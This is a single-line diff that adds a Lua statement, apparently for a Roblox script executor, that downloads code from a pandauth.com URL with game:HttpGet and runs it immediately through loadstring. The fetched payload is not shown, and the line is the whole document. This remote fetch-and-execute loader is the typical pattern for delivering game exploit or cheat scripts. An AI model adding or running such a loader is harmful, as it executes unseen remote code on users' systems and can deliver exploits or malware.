@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://vss.pandauth.com/kv/2b70db25ae9ac086"))()
